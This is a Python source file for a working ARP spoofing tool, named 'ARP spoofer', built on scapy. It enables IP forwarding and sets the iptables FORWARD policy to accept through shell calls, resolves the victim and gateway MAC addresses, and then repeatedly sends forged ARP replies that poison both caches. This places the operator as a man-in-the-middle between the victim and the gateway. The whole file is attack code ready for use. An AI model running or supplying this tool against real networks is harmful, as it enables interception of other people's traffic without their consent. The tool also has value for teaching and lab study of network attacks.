import argparse
import time
import os
import sys

import colorama
from colorama import Fore, Style
from typing import List, Tuple, Optional

from scapy.layers.l2 import ARP, Ether
from scapy.sendrecv import srp, send

colorama.init()


def iptables_forward_accept() -> None:
    # if it doesn't work, try this one instead:
    # sudo iptables -F
    os.system('sudo iptables --policy FORWARD ACCEPT')


def iptables_forward_drop() -> None:
    os.system('sudo iptables --policy FORWARD DROP')


def _enable_linux_iproute():
    """
    Enables IP route ( IP Forward ) in linux-based distro
    """

    file_path = "/proc/sys/net/ipv4/ip_forward"
    with open(file_path) as f:
        if f.read() == 1:
            # already enabled
            return
    with open(file_path, "w") as f:
        print(1, file=f)

    iptables_forward_accept()


def _enable_windows_iproute():
    """
    Enables IP route (IP Forwarding) in Windows
    """
    from services import WService
    # enable Remote Access service
    service = WService("RemoteAccess")
    service.start()


def enable_ip_route(verbose: bool = True):
    """
    Enables IP forwarding
    """
    if verbose:
        print(f"{Fore.GREEN}[!]{Style.RESET_ALL} Enabling IP Routing...")
    _enable_windows_iproute() if "nt" in os.name else _enable_linux_iproute()
    if verbose:
        print(f"{Fore.GREEN}[!]{Style.RESET_ALL} IP Routing enabled.")


def get_mac(ip: str) -> Optional[str]:
    """
    Returns MAC address of any device connected to the network
    If ip is down, returns None instead
    """

    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=ip), timeout=5, verbose=0)
    if ans:
        return ans[0][1].hwsrc


def spoof(target: Tuple[str, str], host: Tuple[str, str], verbose=True) -> None:
    """
    Spoofs `target_ip` by saying it that we are `host_ip`.
    It is accomplished by changing the ARP cache of the target (poisoning)
    """

    target_mac, target_ip = target
    _, host_ip = host

    # craft the arp 'is-at' operation packet, in other words; an ARP response
    # we don't specify 'hwsrc' (source MAC address)
    # because by default, 'hwsrc' is the real MAC address of the sender (ours)
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')

    # send the packet
    send(arp_response, verbose=0)

    if verbose:
        # get the MAC address of the default interface we are using
        self_mac = ARP().hwsrc
        print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Sent to {Style.BRIGHT}{target_ip: <15}{Style.RESET_ALL} : "
              f"{Style.BRIGHT}{host_ip: <15}{Style.RESET_ALL} is-at {Style.BRIGHT}{self_mac: <17}{Style.RESET_ALL}")


def restore(target: Tuple[str, str], host: Tuple[str, str], verbose=True) -> None:
    """
    Restores the normal process of a regular network
    This is done by sending the original information
    (real IP and MAC of `host_ip` ) to `target_ip`
    """

    target_mac, target_ip = target
    host_mac, host_ip = host

    # crafting the restoring packet
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac, op="is-at")

    # sending the restoring packet
    # to restore the network to its normal process
    # we send each reply seven times for a good measure (count=7)
    send(arp_response, verbose=0, count=7)
    if verbose:
        print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Sent to {Style.BRIGHT}{target_ip: <15}{Style.RESET_ALL} : "
              f"{Style.BRIGHT}{host_ip: <15}{Style.RESET_ALL} is-at {Style.BRIGHT}{host_mac: <17}{Style.RESET_ALL}")


def main(args: argparse.Namespace) -> None:
    enable_ip_route()

    verbose = True
    victim_mac = get_mac(args.victim)
    gateway_mac = get_mac(args.gateway)

    if victim_mac is None:
        print(f"{Fore.RED}[-] Couldn't get victim mac{Style.RESET_ALL}")
        sys.exit(1)
    if gateway_mac is None:
        print(f"{Fore.RED}[-] Couldn't get gateway mac{Style.RESET_ALL}")
        sys.exit(1)

    victim = (victim_mac, args.victim)
    gateway = (gateway_mac, args.gateway)

    try:
        while True:
            spoof(victim, gateway, verbose=verbose)
            time.sleep(0.01)
            spoof(gateway, victim, verbose=verbose)

            time.sleep(args.timeout)
    except KeyboardInterrupt:
        pass
    finally:
        print(f'{Fore.GREEN}[+]{Style.RESET_ALL} Restoring')
        restore(victim, gateway)
        restore(gateway, victim)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(prog='ARP spoofer')
    parser.add_argument('-v', '--victim', type=str, help='Victim IP address', required=True)
    parser.add_argument('-g', '--gateway', type=str, help='Gateway IP address', required=True)
    parser.add_argument('-t', '--timeout', type=float, help='Timeout between ARP packets (seconds)',
                        default=1.0)
    args = parser.parse_args()

    main(args)
